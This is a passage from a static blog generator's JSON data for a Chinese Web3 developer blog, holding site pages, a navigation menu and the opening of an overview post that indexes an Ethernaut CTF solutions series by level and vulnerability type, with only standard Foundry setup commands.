ublic/js/book.js","hash":"c150427c7397aea35ad83624f8db8f4b19846bb6","modified":1757402344143}],"Category":[{"name":"Dapp","_id":"cmfc7zbou0004bf5qc0c6gicb"},{"name":"Web3安全","_id":"cmfc7zbp0000cbf5qcu6ze2k0"},{"name":"Ethernaut 系列","_id":"cmfc7zbp4000kbf5q8gwx3tju"},{"name":"智能合约","parent":"cmfc7zbp0000cbf5qcu6ze2k0","_id":"cmfc7zbpc0012bf5q1k9gdz63"},{"name":"基础攻击篇 (1-10)","parent":"cmfc7zbp4000kbf5q8gwx3tju","_id":"cmfc7zbpg001abf5qc0vaef9w"},{"name":"进阶攻击篇 (11-20)","parent":"cmfc7zbp4000kbf5q8gwx3tju","_id":"cmfc7zbpr002mbf5q8m5c4omq"},{"name":"高级攻击篇 (21-25)","parent":"cmfc7zbp4000kbf5q8gwx3tju","_id":"cmfc7zbpy0049bf5q3qe2g7dw"},{"name":"Web3开发","_id":"cmfc7zbq10050bf5q3o0pf1yw"},{"name":"工具配置","parent":"cmfc7zbq10050bf5q3o0pf1yw","_id":"cmfc7zbq20057bf5q4a5fgdd9"},{"name":"Ethernaut","parent":"cmfc7zbq20057bf5q4a5fgdd9","_id":"cmfc7zbq3005abf5qc137bvzm"}],"Data":[],"Page":[{"title":"首页","date":"2025-01-24T16:00:00.000Z","_content":"\n# 欢迎来到 Kent's Blog\n\n> 专注于 Web3.0 和区块链技术的开发者\n\n## 👋 关于我\n\n我是 Kent，一名专注于 **Web3.0** 和 **区块链技术** 的开发者。\n\n## 🔥 技术专长\n\n- **去中心化应用 (Dapp) 开发**\n- **Solidity 智能合约编程**\n- **Rust 区块链开发**\n- **基于 Reth SDK 的自定义区块链构建**\n\n## 📝 博客内容\n\n在这里，我会分享：\n\n- Web3.0 技术深度解析\n- 智能合约开发经验\n- 区块链项目实战\n- Rust 生态在区块链中的应用\n- 去中心化技术趋势\n\n## 🚀 最新文章\n\n欢迎浏览我的 [最新文章](/archives)，了解最前沿的区块链开发技术！\n\n---\n\n*让我们一起探索去中心化的未来！*","source":"home.md","raw":"---\ntitle: 首页\ndate: 2025-01-25\n---\n\n# 欢迎来到 Kent's Blog\n\n> 专注于 Web3.0 和区块链技术的开发者\n\n## 👋 关于我\n\n我是 Kent，一名专注于 **Web3.0** 和 **区块链技术** 的开发者。\n\n## 🔥 技术专长\n\n- **去中心化应用 (Dapp) 开发**\n- **Solidity 智能合约编程**\n- **Rust 区块链开发**\n- **基于 Reth SDK 的自定义区块链构建**\n\n## 📝 博客内容\n\n在这里，我会分享：\n\n- Web3.0 技术深度解析\n- 智能合约开发经验\n- 区块链项目实战\n- Rust 生态在区块链中的应用\n- 去中心化技术趋势\n\n## 🚀 最新文章\n\n欢迎浏览我的 [最新文章](/archives)，了解最前沿的区块链开发技术！\n\n---\n\n*让我们一起探索去中心化的未来！*","updated":"2025-09-09T02:23:26.354Z","path":"home.html","comments":1,"layout":"page","_id":"cmfc7zboo0000bf5qauxd3nf9","content":"<h1 id=\"欢迎来到-Kent’s-Blog\"><a href=\"#欢迎来到-Kent’s-Blog\" class=\"headerlink\" title=\"欢迎来到 Kent’s Blog\"></a>欢迎来到 Kent’s Blog</h1><blockquote>\n<p>专注于 Web3.0 和区块链技术的开发者</p>\n</blockquote>\n<h2 id=\"👋-关于我\"><a href=\"#👋-关于我\" class=\"headerlink\" title=\"👋 关于我\"></a>👋 关于我</h2><p>我是 Kent，一名专注于 <strong>Web3.0</strong> 和 <strong>区块链技术</strong> 的开发者。</p>\n<h2 id=\"🔥-技术专长\"><a href=\"#🔥-技术专长\" class=\"headerlink\" title=\"🔥 技术专长\"></a>🔥 技术专长</h2><ul>\n<li><strong>去中心化应用 (Dapp) 开发</strong></li>\n<li><strong>Solidity 智能合约编程</strong></li>\n<li><strong>Rust 区块链开发</strong></li>\n<li><strong>基于 Reth SDK 的自定义区块链构建</strong></li>\n</ul>\n<h2 id=\"📝-博客内容\"><a href=\"#📝-博客内容\" class=\"headerlink\" title=\"📝 博客内容\"></a>📝 博客内容</h2><p>在这里，我会分享：</p>\n<ul>\n<li>Web3.0 技术深度解析</li>\n<li>智能合约开发经验</li>\n<li>区块链项目实战</li>\n<li>Rust 生态在区块链中的应用</li>\n<li>去中心化技术趋势</li>\n</ul>\n<h2 id=\"🚀-最新文章\"><a href=\"#🚀-最新文章\" class=\"headerlink\" title=\"🚀 最新文章\"></a>🚀 最新文章</h2><p>欢迎浏览我的 <a href=\"/archives\">最新文章</a>，了解最前沿的区块链开发技术！</p>\n<hr>\n<p><em>让我们一起探索去中心化的未来！</em></p>\n","excerpt":"","more":"<h1 id=\"欢迎来到-Kent’s-Blog\"><a href=\"#欢迎来到-Kent’s-Blog\" class=\"headerlink\" title=\"欢迎来到 Kent’s Blog\"></a>欢迎来到 Kent’s Blog</h1><blockquote>\n<p>专注于 Web3.0 和区块链技术的开发者</p>\n</blockquote>\n<h2 id=\"👋-关于我\"><a href=\"#👋-关于我\" class=\"headerlink\" title=\"👋 关于我\"></a>👋 关于我</h2><p>我是 Kent，一名专注于 <strong>Web3.0</strong> 和 <strong>区块链技术</strong> 的开发者。</p>\n<h2 id=\"🔥-技术专长\"><a href=\"#🔥-技术专长\" class=\"headerlink\" title=\"🔥 技术专长\"></a>🔥 技术专长</h2><ul>\n<li><strong>去中心化应用 (Dapp) 开发</strong></li>\n<li><strong>Solidity 智能合约编程</strong></li>\n<li><strong>Rust 区块链开发</strong></li>\n<li><strong>基于 Reth SDK 的自定义区块链构建</strong></li>\n</ul>\n<h2 id=\"📝-博客内容\"><a href=\"#📝-博客内容\" class=\"headerlink\" title=\"📝 博客内容\"></a>📝 博客内容</h2><p>在这里，我会分享：</p>\n<ul>\n<li>Web3.0 技术深度解析</li>\n<li>智能合约开发经验</li>\n<li>区块链项目实战</li>\n<li>Rust 生态在区块链中的应用</li>\n<li>去中心化技术趋势</li>\n</ul>\n<h2 id=\"🚀-最新文章\"><a href=\"#🚀-最新文章\" class=\"headerlink\" title=\"🚀 最新文章\"></a>🚀 最新文章</h2><p>欢迎浏览我的 <a href=\"/archives\">最新文章</a>，了解最前沿的区块链开发技术！</p>\n<hr>\n<p><em>让我们一起探索去中心化的未来！</em></p>\n"},{"title":"导航菜单","date":"2025-01-24T16:00:00.000Z","_content":"\n## 主要内容\n\n- [首页](/)\n- [文章归档](/archives)\n- [分类浏览](/categories) \n- [标签云](/tags)\n\n## Web3.0 专区\n\n- [Dapp 开发](/categories/Dapp)\n- [智能合约](/tags/solidity)\n- [区块链技术](/tags/blockchain)\n- [Web3安全](/categories/Web3安全)\n\n## Ethernaut&Foundry 系列 🛡️\n\n- [系列总览](/2025/01/25/ethernaut-foundry-solutions-series/)\n- [Foundry 环境搭建](/2025/01/25/foundry-setup-guide/)\n- [Level 1: Fallback](/2025/01/25/ethernaut-level-01-fallback/)\n- [Level 2: Fallout](/2025/01/25/ethernaut-level-02-fallout/)\n- [Level 3: Coin Flip](/2025/01/25/ethernaut-level-03-coinflip/)\n- [Level 4: Telephone](/2025/01/25/ethernaut-level-04-telephone/)\n- [Level 5: Token](/2025/01/25/ethernaut-level-05-token/)\n- [Level 6: Delegation](/2025/01/25/ethernaut-level-06-delegation/)\n- [Level 7: Force](/2025/01/25/ethernaut-level-07-force/)\n- [Level 8: Vault](/2025/01/25/ethernaut-level-08-vault/)\n- [Level 9: King](/2025/01/25/ethernaut-level-09-king/)\n- [Level 10: Re-entrancy](/2025/01/25/ethernaut-level-10-reentrancy/)\n- [Level 11: Elevator](/2025/01/25/ethernaut-level-11-elevator/)\n- [Level 12: Privacy](/2025/01/25/ethernaut-level-12-privacy/)\n- [Level 13: Gatekeeper One](/2025/01/25/ethernaut-level-13-gatekeeper-one/)\n- [Level 14: Gatekeeper Two](/2025/01/25/ethernaut-level-14-gatekeeper-two/)\n- [Level 15: Naught Coin](/2025/01/25/ethernaut-level-15-naught-coin/)\n- [Level 16: Preservation](/2025/01/25/ethernaut-level-16-preservation/)\n- [Level 17: Recovery](/2025/01/25/ethernaut-level-17-recovery/)\n- [Level 18: Magic Number](/2025/01/25/ethernaut-level-18-magic-number/)\n- [Level 19: Alien Codex](/2025/01/25/ethernaut-level-19-alien-codex/)\n- [Level 20: Denial](/2025/01/25/ethernaut-level-20-denial/)\n- [Level 21: Shop](/2025/01/25/ethernaut-level-21-shop/)\n- [Level 22: Dex](/2025/01/25/ethernaut-level-22-dex/)\n- [Level 23: Dex Two](/2025/01/25/ethernaut-level-23-dex-two/)\n- [Level 24: Puzzle Wallet](/2025/01/25/ethernaut-level-24-puzzle-wallet/)\n- [Level 25: Motorbike](/2025/01/25/ethernaut-level-25-motorbike/)\n\n## 个人页面\n\n- [关于我](/about)\n- [项目展示](/repository)\n- [书单推荐](/books)\n- [友情链接](/links)","source":"menu.md","raw":"---\ntitle: 导航菜单\ndate: 2025-01-25\n---\n\n## 主要内容\n\n- [首页](/)\n- [文章归档](/archives)\n- [分类浏览](/categories) \n- [标签云](/tags)\n\n## Web3.0 专区\n\n- [Dapp 开发](/categories/Dapp)\n- [智能合约](/tags/solidity)\n- [区块链技术](/tags/blockchain)\n- [Web3安全](/categories/Web3安全)\n\n## Ethernaut&Foundry 系列 🛡️\n\n- [系列总览](/2025/01/25/ethernaut-foundry-solutions-series/)\n- [Foundry 环境搭建](/2025/01/25/foundry-setup-guide/)\n- [Level 1: Fallback](/2025/01/25/ethernaut-level-01-fallback/)\n- [Level 2: Fallout](/2025/01/25/ethernaut-level-02-fallout/)\n- [Level 3: Coin Flip](/2025/01/25/ethernaut-level-03-coinflip/)\n- [Level 4: Telephone](/2025/01/25/ethernaut-level-04-telephone/)\n- [Level 5: Token](/2025/01/25/ethernaut-level-05-token/)\n- [Level 6: Delegation](/2025/01/25/ethernaut-level-06-delegation/)\n- [Level 7: Force](/2025/01/25/ethernaut-level-07-force/)\n- [Level 8: Vault](/2025/01/25/ethernaut-level-08-vault/)\n- [Level 9: King](/2025/01/25/ethernaut-level-09-king/)\n- [Level 10: Re-entrancy](/2025/01/25/ethernaut-level-10-reentrancy/)\n- [Level 11: Elevator](/2025/01/25/ethernaut-level-11-elevator/)\n- [Level 12: Privacy](/2025/01/25/ethernaut-level-12-privacy/)\n- [Level 13: Gatekeeper One](/2025/01/25/ethernaut-level-13-gatekeeper-one/)\n- [Level 14: Gatekeeper Two](/2025/01/25/ethernaut-level-14-gatekeeper-two/)\n- [Level 15: Naught Coin](/2025/01/25/ethernaut-level-15-naught-coin/)\n- [Level 16: Preservation](/2025/01/25/ethernaut-level-16-preservation/)\n- [Level 17: Recovery](/2025/01/25/ethernaut-level-17-recovery/)\n- [Level 18: Magic Number](/2025/01/25/ethernaut-level-18-magic-number/)\n- [Level 19: Alien Codex](/2025/01/25/ethernaut-level-19-alien-codex/)\n- [Level 20: Denial](/2025/01/25/ethernaut-level-20-denial/)\n- [Level 21: Shop](/2025/01/25/ethernaut-level-21-shop/)\n- [Level 22: Dex](/2025/01/25/ethernaut-level-22-dex/)\n- [Level 23: Dex Two](/2025/01/25/ethernaut-level-23-dex-two/)\n- [Level 24: Puzzle Wallet](/2025/01/25/ethernaut-level-24-puzzle-wallet/)\n- [Level 25: Motorbike](/2025/01/25/ethernaut-level-25-motorbike/)\n\n## 个人页面\n\n- [关于我](/about)\n- [项目展示](/repository)\n- [书单推荐](/books)\n- [友情链接](/links)","updated":"2025-09-09T07:09:50.286Z","path":"menu.html","comments":1,"layout":"page","_id":"cmfc7zbos0002bf5q0j84bpo5","content":"<h2 id=\"主要内容\"><a href=\"#主要内容\" class=\"headerlink\" title=\"主要内容\"></a>主要内容</h2><ul>\n<li><a href=\"/\">首页</a></li>\n<li><a href=\"/archives\">文章归档</a></li>\n<li><a href=\"/categories\">分类浏览</a> </li>\n<li><a href=\"/tags\">标签云</a></li>\n</ul>\n<h2 id=\"Web3-0-专区\"><a href=\"#Web3-0-专区\" class=\"headerlink\" title=\"Web3.0 专区\"></a>Web3.0 专区</h2><ul>\n<li><a href=\"/categories/Dapp\">Dapp 开发</a></li>\n<li><a href=\"/tags/solidity\">智能合约</a></li>\n<li><a href=\"/tags/blockchain\">区块链技术</a></li>\n<li><a href=\"/categories/Web3%E5%AE%89%E5%85%A8\">Web3安全</a></li>\n</ul>\n<h2 id=\"Ethernaut-Foundry-系列-🛡️\"><a href=\"#Ethernaut-Foundry-系列-🛡️\" class=\"headerlink\" title=\"Ethernaut&amp;Foundry 系列 🛡️\"></a>Ethernaut&amp;Foundry 系列 🛡️</h2><ul>\n<li><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">系列总览</a></li>\n<li><a href=\"/2025/01/25/foundry-setup-guide/\">Foundry 环境搭建</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-01-fallback/\">Level 1: Fallback</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-02-fallout/\">Level 2: Fallout</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-03-coinflip/\">Level 3: Coin Flip</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-04-telephone/\">Level 4: Telephone</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-05-token/\">Level 5: Token</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-06-delegation/\">Level 6: Delegation</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-07-force/\">Level 7: Force</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-08-vault/\">Level 8: Vault</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-09-king/\">Level 9: King</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-10-reentrancy/\">Level 10: Re-entrancy</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-11-elevator/\">Level 11: Elevator</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-12-privacy/\">Level 12: Privacy</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-13-gatekeeper-one/\">Level 13: Gatekeeper One</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-14-gatekeeper-two/\">Level 14: Gatekeeper Two</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-15-naught-coin/\">Level 15: Naught Coin</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-16-preservation/\">Level 16: Preservation</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-17-recovery/\">Level 17: Recovery</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-18-magic-number/\">Level 18: Magic Number</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-19-alien-codex/\">Level 19: Alien Codex</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-20-denial/\">Level 20: Denial</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-21-shop/\">Level 21: Shop</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-22-dex/\">Level 22: Dex</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-23-dex-two/\">Level 23: Dex Two</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-24-puzzle-wallet/\">Level 24: Puzzle Wallet</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-25-motorbike/\">Level 25: Motorbike</a></li>\n</ul>\n<h2 id=\"个人页面\"><a href=\"#个人页面\" class=\"headerlink\" title=\"个人页面\"></a>个人页面</h2><ul>\n<li><a href=\"/about\">关于我</a></li>\n<li><a href=\"/repository\">项目展示</a></li>\n<li><a href=\"/books\">书单推荐</a></li>\n<li><a href=\"/links\">友情链接</a></li>\n</ul>\n","excerpt":"","more":"<h2 id=\"主要内容\"><a href=\"#主要内容\" class=\"headerlink\" title=\"主要内容\"></a>主要内容</h2><ul>\n<li><a href=\"/\">首页</a></li>\n<li><a href=\"/archives\">文章归档</a></li>\n<li><a href=\"/categories\">分类浏览</a> </li>\n<li><a href=\"/tags\">标签云</a></li>\n</ul>\n<h2 id=\"Web3-0-专区\"><a href=\"#Web3-0-专区\" class=\"headerlink\" title=\"Web3.0 专区\"></a>Web3.0 专区</h2><ul>\n<li><a href=\"/categories/Dapp\">Dapp 开发</a></li>\n<li><a href=\"/tags/solidity\">智能合约</a></li>\n<li><a href=\"/tags/blockchain\">区块链技术</a></li>\n<li><a href=\"/categories/Web3%E5%AE%89%E5%85%A8\">Web3安全</a></li>\n</ul>\n<h2 id=\"Ethernaut-Foundry-系列-🛡️\"><a href=\"#Ethernaut-Foundry-系列-🛡️\" class=\"headerlink\" title=\"Ethernaut&amp;Foundry 系列 🛡️\"></a>Ethernaut&amp;Foundry 系列 🛡️</h2><ul>\n<li><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">系列总览</a></li>\n<li><a href=\"/2025/01/25/foundry-setup-guide/\">Foundry 环境搭建</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-01-fallback/\">Level 1: Fallback</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-02-fallout/\">Level 2: Fallout</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-03-coinflip/\">Level 3: Coin Flip</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-04-telephone/\">Level 4: Telephone</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-05-token/\">Level 5: Token</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-06-delegation/\">Level 6: Delegation</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-07-force/\">Level 7: Force</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-08-vault/\">Level 8: Vault</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-09-king/\">Level 9: King</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-10-reentrancy/\">Level 10: Re-entrancy</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-11-elevator/\">Level 11: Elevator</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-12-privacy/\">Level 12: Privacy</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-13-gatekeeper-one/\">Level 13: Gatekeeper One</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-14-gatekeeper-two/\">Level 14: Gatekeeper Two</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-15-naught-coin/\">Level 15: Naught Coin</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-16-preservation/\">Level 16: Preservation</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-17-recovery/\">Level 17: Recovery</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-18-magic-number/\">Level 18: Magic Number</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-19-alien-codex/\">Level 19: Alien Codex</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-20-denial/\">Level 20: Denial</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-21-shop/\">Level 21: Shop</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-22-dex/\">Level 22: Dex</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-23-dex-two/\">Level 23: Dex Two</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-24-puzzle-wallet/\">Level 24: Puzzle Wallet</a></li>\n<li><a href=\"/2025/01/25/ethernaut-level-25-motorbike/\">Level 25: Motorbike</a></li>\n</ul>\n<h2 id=\"个人页面\"><a href=\"#个人页面\" class=\"headerlink\" title=\"个人页面\"></a>个人页面</h2><ul>\n<li><a href=\"/about\">关于我</a></li>\n<li><a href=\"/repository\">项目展示</a></li>\n<li><a href=\"/books\">书单推荐</a></li>\n<li><a href=\"/links\">友情链接</a></li>\n</ul>\n"},{"title":"关于","description":"个人简介","layout":"about","comments":0,"sidebar":"custom","_content":"个人详细介绍","source":"about/index.md","raw":"---\ntitle: 关于\ndescription: 个人简介\nlayout: about\ncomments: false\nsidebar: custom\n---\n个人详细介绍","date":"2025-09-08T03:49:04.027Z","updated":"2025-09-08T03:49:04.027Z","path":"about/index.html","_id":"cmfc7zbow0006bf5qctjog2gq","content":"<p>个人详细介绍</p>\n","excerpt":"","more":"<p>个人详细介绍</p>\n"},{"title":"404 Not Found：该页无法显示","toc":false,"comments":0,"_content":"<script type=\"text/javascript\" src=\"//www.qq.com/404/search_children.js\" charset=\"utf-8\" homePageUrl=\"<%- config.url %>\" homePageName=\"回到我的主页\"></script>\n","source":"404/index.md","raw":"---\ntitle: 404 Not Found：该页无法显示\ntoc: false\ncomments: false\npermalink: /404\n---\n<script type=\"text/javascript\" src=\"//www.qq.com/404/search_children.js\" charset=\"utf-8\" homePageUrl=\"<%- config.url %>\" homePageName=\"回到我的主页\"></script>\n","date":"2025-09-08T03:49:04.027Z","updated":"2025-09-08T03:49:04.027Z","path":"/404.html","layout":"page","_id":"cmfc7zboy0008bf5qcx38hvxl","content":"<script type=\"text/javascript\" src=\"//www.qq.com/404/search_children.js\" charset=\"utf-8\" homePageUrl=\"<%- config.url %>\" homePageName=\"回到我的主页\"></script>\n","excerpt":"","more":"<script type=\"text/javascript\" src=\"//www.qq.com/404/search_children.js\" charset=\"utf-8\" homePageUrl=\"<%- config.url %>\" homePageName=\"回到我的主页\"></script>\n"},{"title":"书单","layout":"books","comments":0,"sidebar":"none","_content":"","source":"books/index.md","raw":"---\ntitle: 书单\nlayout: books\ncomments: false\nsidebar: none\n---","date":"2025-09-08T03:49:04.027Z","updated":"2025-09-08T03:49:04.027Z","path":"books/index.html","_id":"cmfc7zboz000abf5q1xjpd9wq","content":"","excerpt":"","more":""},{"title":"分类","layout":"categories","comments":0,"_content":"","source":"categories/index.md","raw":"---\ntitle: 分类\nlayout: categories\ncomments: false\n---\n","date":"2025-09-08T03:49:04.027Z","updated":"2025-09-08T03:49:04.027Z","path":"categories/index.html","_id":"cmfc7zbp1000fbf5q1vgs3oyb","content":"","excerpt":"","more":""},{"title":"友情链接","layout":"links","comments":1,"sidebar":"none","_content":"","source":"links/index.md","raw":"---\ntitle: 友情链接\nlayout: links\ncomments: true\nsidebar: none\n---","date":"2025-09-08T03:49:04.027Z","updated":"2025-09-08T03:49:04.027Z","path":"links/index.html","_id":"cmfc7zbp3000hbf5q4vrd6fw2","content":"","excerpt":"","more":""},{"title":"Repositories","layout":"repository","comments":0,"sidebar":"none","_content":"","source":"repository/index.md","raw":"---\ntitle: Repositories\nlayout: repository\ncomments: false\nsidebar: none\n---\n","date":"2025-09-08T03:49:04.027Z","updated":"2025-09-08T03:49:04.027Z","path":"repository/index.html","_id":"cmfc7zbp4000mbf5q6rsb71la","content":"","excerpt":"","more":""},{"title":"标签","layout":"tags","comments":0,"_content":"","source":"tags/index.md","raw":"---\ntitle: 标签\nlayout: tags\ncomments: false\n---\n","date":"2025-09-08T03:49:04.027Z","updated":"2025-09-08T03:49:04.027Z","path":"tags/index.html","_id":"cmfc7zbp5000obf5q9j703rnp","content":"","excerpt":"","more":""}],"Post":[{"title":"Dapp","date":"2025-01-25T12:20:29.000Z","_content":"\n## Dapp\n\n### dapp type\nsolidity\nrust\n","source":"_posts/Dapp.md","raw":"---\ntitle: Dapp\ndate: 2025-01-25 20:20:29\ntags: dapp\ncategories:\n- Dapp\n---\n\n## Dapp\n\n### dapp type\nsolidity\nrust\n","slug":"Dapp","published":1,"updated":"2025-09-08T03:49:04.027Z","comments":1,"layout":"post","photos":[],"_id":"cmfc7zboq0001bf5q1n3kad9f","content":"<h2 id=\"Dapp\"><a href=\"#Dapp\" class=\"headerlink\" title=\"Dapp\"></a>Dapp</h2><h3 id=\"dapp-type\"><a href=\"#dapp-type\" class=\"headerlink\" title=\"dapp type\"></a>dapp type</h3><p>solidity<br>rust</p>\n","excerpt":"","more":"<h2 id=\"Dapp\"><a href=\"#Dapp\" class=\"headerlink\" title=\"Dapp\"></a>Dapp</h2><h3 id=\"dapp-type\"><a href=\"#dapp-type\" class=\"headerlink\" title=\"dapp type\"></a>dapp type</h3><p>solidity<br>rust</p>\n"},{"title":"Ethernaut Foundry Solutions - 完整系列教程","date":"2025-01-25T06:00:00.000Z","updated":"2025-01-25T06:00:00.000Z","excerpt":"深入解析如何使用 Foundry 框架解决 OpenZeppelin Ethernaut CTF 挑战，从基础设置到高级攻击技术的完整指南。","_content":"\n# 🛡️ Ethernaut Foundry Solutions - 完整系列教程\n\n> **Ethernaut** 是由 OpenZeppelin 开发的 Web3/Solidity 智能合约安全 CTF（Capture The Flag）游戏，灵感来源于 overthewire.org。每个关卡都是一个智能合约，玩家需要找到漏洞并利用它们来完成挑战。\n\n## 📚 系列介绍\n\n本系列文章详细介绍如何使用 **Foundry** 框架来解决 Ethernaut 的各个挑战。Foundry 是一个现代化的以太坊开发工具套件，提供了强大的测试、部署和调试功能。\n\n### 🎯 学习目标\n\n通过本系列，你将学会：\n\n- ✅ **Foundry 框架的使用**：从安装到高级功能\n- ✅ **智能合约安全审计**：识别常见漏洞模式\n- ✅ **攻击技术实现**：重入攻击、整数溢出、权限提升等\n- ✅ **防御机制设计**：如何编写更安全的智能合约\n- ✅ **CTF 解题思路**：系统化的安全分析方法\n\n## 🏗️ 技术栈\n\n- **Foundry**: 以太坊开发框架\n- **Solidity**: 智能合约编程语言\n- **OpenZeppelin**: 安全合约库\n- **EVM**: 以太坊虚拟机\n\n## 📖 完整关卡列表\n\n### 基础攻击篇 (Level 1-10)\n\n1. **[Level 1: Fallback - 回退函数漏洞](/2025/01/25/ethernaut-level-01-fallback/)**\n   - Fallback 函数权限提升\n   - 最基础的合约攻击\n\n2. **[Level 2: Fallout - 构造函数拼写错误](/2025/01/25/ethernaut-level-02-fallout/)**\n   - 构造函数命名漏洞\n   - 代码审计重要性\n\n3. **[Level 3: Coin Flip - 伪随机数攻击](/2025/01/25/ethernaut-level-03-coinflip/)**\n   - 区块链伪随机数漏洞\n   - 可预测性攻击\n\n4. **[Level 4: Telephone - tx.origin vs msg.sender](/2025/01/25/ethernaut-level-04-telephone/)**\n   - 身份验证绕过\n   - 中间合约攻击\n\n5. **[Level 5: Token - 整数下溢攻击](/2025/01/25/ethernaut-level-05-token/)**\n   - 算术溢出漏洞\n   - SafeMath 的重要性\n\n6. **[Level 6: Delegation - delegatecall 攻击](/2025/01/25/ethernaut-level-06-delegation/)**\n   - delegatecall 存储槽攻击\n   - 上下文切换漏洞\n\n7. **[Level 7: Force - 强制发送以太币](/2025/01/25/ethernaut-level-07-force/)**\n   - selfdestruct 强制转账\n   - 合约余额操控\n\n8. **[Level 8: Vault - 私有变量读取](/2025/01/25/ethernaut-level-08-vault/)**\n   - 区块链数据透明性\n   - 存储槽分析\n\n9. **[Level 9: King - 拒绝服务攻击](/2025/01/25/ethernaut-level-09-king/)**\n   - DoS 攻击模式\n   - 恶意合约阻断\n\n10. **[Level 10: Re-entrancy - 重入攻击](/2025/01/25/ethernaut-level-10-reentrancy/)**\n    - 经典重入攻击\n    - 检查-效果-交互模式\n\n### 进阶攻击篇 (Level 11-20)\n\n11. **[Level 11: Elevator - 接口实现攻击](/2025/01/25/ethernaut-level-11-elevator/)**\n    - 接口恶意实现\n    - 状态变化利用\n\n12. **[Level 12: Privacy - 存储布局分析](/2025/01/25/ethernaut-level-12-privacy/)**\n    - 复杂存储布局\n    - 私有数据提取\n\n13. **[Level 13: Gatekeeper One - 多重验证绕过](/2025/01/25/ethernaut-level-13-gatekeeper-one/)**\n    - Gas 精确控制\n    - 类型转换攻击\n\n14. **[Level 14: Gatekeeper Two - 高级验证绕过](/2025/01/25/ethernaut-level-14-gatekeeper-two/)**\n    - 运行时创建合约\n    - 位运算攻击\n\n15. **[Level 15: Naught Coin - ERC20 授权攻击](/2025/01/25/ethernaut-level-15-naughtcoin/)**\n    - ERC20 transferFrom 绕过\n    - 授权机制漏洞\n\n16. **[Level 16: Preservation - 存储槽劫持](/2025/01/25/ethernaut-level-16-preservation/)**\n    - 存储槽布局攻击\n    - delegatecall 高级利用\n\n17. **[Level 17: Recovery - 合约地址计算](/2025/01/25/ethernaut-level-17-recovery/)**\n    - CREATE 地址预测\n    - 丢失合约恢复\n\n18. **[Level 18: Magic Number - 字节码分析](/2025/01/25/ethernaut-level-18-magicnumber/)**\n    - 手写字节码\n    - EVM 底层原理\n\n19. **[Level 19: Alien Codex - 数组边界攻击](/2025/01/25/ethernaut-level-19-aliencodex/)**\n    - 动态数组下溢\n    - 存储槽任意写入\n\n20. **[Level 20: Denial - Gas 耗尽攻击](/2025/01/25/ethernaut-level-20-denial/)**\n    - 分红合约攻击\n    - Gas 消耗 DoS\n\n### 高级攻击篇 (Level 21-25)\n\n21. **[Level 21: Shop - 视图函数攻击](/2025/01/25/ethernaut-level-21-shop/)**\n    - view 函数状态利用\n    - 价格操控攻击\n\n22. **[Level 22: Dex - DEX 价格操控](/2025/01/25/ethernaut-level-22-dex/)**\n    - AMM 价格计算漏洞\n    - 流动性攻击\n\n23. **[Level 23: Dex Two - 代币注入攻击](/2025/01/25/ethernaut-level-23-dextwo/)**\n    - 恶意代币注入\n    - DEX 安全进阶\n\n24. **[Level 24: Puzzle Wallet - 多重签名钱包攻击](/2025/01/25/ethernaut-level-24-puzzlewallet/)**\n    - 代理模式攻击\n    - 复杂状态管理\n\n25. **[Level 25: Motorbike - UUPS 代理攻击](/2025/01/25/ethernaut-level-25-motorbike/)**\n    - 升级模式漏洞\n    - 实现合约攻击\n\n## 🛠️ 快速开始\n\n```bash\n# 克隆项目\ngit clone https://github.com/XuHugo/Ethernaut-Foundry-Solutions.git\ncd Ethernaut-Foundry-Solutions\n\n# 安装依赖\nforge install\n\n# 运行所有测试\nforge test\n\n# 运行特定关卡测试\nforge test --match-contract FallbackTest -vvv\n```\n\n## 🔗 相关资源\n\n- **[GitHub 项目地址](https://github.com/XuHugo/Ethernaut-Foundry-Solutions)**\n- **[Ethernaut 官网](https://ethernaut.openzeppelin.com/)**\n- **[Foundry 官方文档](https://book.getfoundry.sh/)**\n- **[OpenZeppelin 